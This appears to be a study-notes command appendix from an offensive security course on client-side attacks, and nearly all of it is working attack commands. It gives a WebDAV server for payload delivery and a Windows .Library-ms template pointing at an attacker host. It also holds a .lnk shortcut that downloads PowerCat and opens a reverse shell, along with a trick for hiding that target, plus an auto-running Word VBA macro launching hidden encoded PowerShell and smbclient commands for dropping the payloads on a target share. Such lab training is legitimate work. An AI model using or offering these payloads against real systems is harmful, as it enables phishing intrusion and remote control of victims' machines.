# Client-Side Attacks, Command Appendix

Part of [[COMMAND APPENDIX]]. Building and delivering macro/library-file payloads. For the reverse-shell payload itself once delivery lands, see [[Shells & Payloads]].

---

## WsgiDAV (WebDAV server for library-file delivery)

```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
*`--auth=anonymous` disables credential prompts entirely, `--port=80` matches what a library file's `url` tag expects over plain HTTP.*

See [[Client-Side Attacks#Step 1: Set up a WebDAV share on Kali with WsgiDAV|12.3.1, Step 1]].

#### Tags: #WsgiDAV #WebDAV #ClientSideAttacks

---

## Windows Library File (`.Library-ms`) template

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<kali_ip></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Save as `config.Library-ms` (or any name). **Reset to this exact original after every test-open**, Windows rewrites the `url` tag on first use.

See [[Client-Side Attacks#Step 2: Build the Windows library file's XML|12.3.1, Step 2]], tag-by-tag meaning in [[Client-Side Attacks (Breakdowns)|Command Breakdowns]].

#### Tags: #LibraryMs #WindowsLibraryFiles #XML #ClientSideAttacks

---

## `.lnk` shortcut payload (PowerCat via PowerShell target)

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell"
```
Set as a new shortcut's target (right-click desktop → New → Shortcut). Pad with a delimiter + benign command past 255 characters to hide it from a casual Properties check (target field holds up to 4096).

See [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1, Step 4]], PowerCat delivery mechanics in [[Shells & Payloads (Breakdowns)|Command Breakdowns]].

#### Tags: #LNKShortcut #PowerCat #ClientSideAttacks

---

## VBA macro (Office document, AutoOpen + Document_Open)

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "<<=50-char chunk of a base64-encoded (UTF-16LE) powershell -enc payload>>"
    ' ...repeat per chunk...
    CreateObject("Wscript.Shell").Run Str
End Sub
```
Build via **View → Macros → View Macros → Create**, scoped to the document itself (not `Normal.dotm`). Save as `.doc`/`.docm`, `.docx` won't persist the macro.

**Generate the chunked lines mechanically, don't hand-split:**
```bash
b64='<paste $EncodedText output here>'
python3 -c "
s = 'powershell.exe -nop -w hidden -enc ' + '$b64'
for i in range(0, len(s), 50):
    print(f'    Str = Str + \"{s[i:i+50]}\"')
"
```

See [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]], chunking-and-encoding mechanics in [[Shells & Payloads (Breakdowns)|Command Breakdowns]].

#### Tags: #VBA #WordMacros #ClientSideAttacks

---

## RDP into a build/prep machine with clipboard + drive redirection

```bash
xfreerdp /v:<target_ip> /u:offsec /p:lab /dynamic-resolution +clipboard /drive:kali,/home/kali
```
*`+clipboard` enables clipboard sync (missing by default, needed for pasting macro/payload code into the session), `/drive:kali,/home/kali` maps your home directory as a network drive inside the session (for copying built payloads back out). Both flags are safe to combine into one connection from the start rather than reconnecting later for each.*

> **Gotcha:** even with `+clipboard` enabled, just *highlighting* text with the mouse on Linux only populates the **PRIMARY** selection (middle-click paste), which FreeRDP does **not** sync. Only an explicit **Ctrl+C** copy (or a clipboard tool like `xclip -selection clipboard`) populates the actual CLIPBOARD selection that gets forwarded into the RDP session.

See [[Client-Side Attacks#🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)|Client-Side Attacks, Lab 1 Rebuild]].

#### Tags: #Xfreerdp #ClipboardRedirection #DriveRedirection #ClientSideAttacks

---

## Upload a payload to a target's SMB share (one-shot, non-interactive)

```bash
smbclient //<target_ip>/share -c 'put config.Library-ms'
smbclient //<target_ip>/share -c 'put ticket.doc'
```
*`-c '<command>'` runs a single command non-interactively instead of dropping into an interactive `smb: \>` prompt, useful for scripting a one-shot delivery.*

See [[Client-Side Attacks#Step 6: Full delivery to a target (HR137, via a simulated email/SMB drop)|12.3.1, Step 6]].

#### Tags: #Smbclient #SMB #ClientSideAttacks

---

## **Outstanding**
This area grows alongside the module. Whenever a new client-side delivery mechanism comes up (HTA files, JScript/WSH, malicious ISO/container MOTW bypasses), add it here with a link back to the source section.
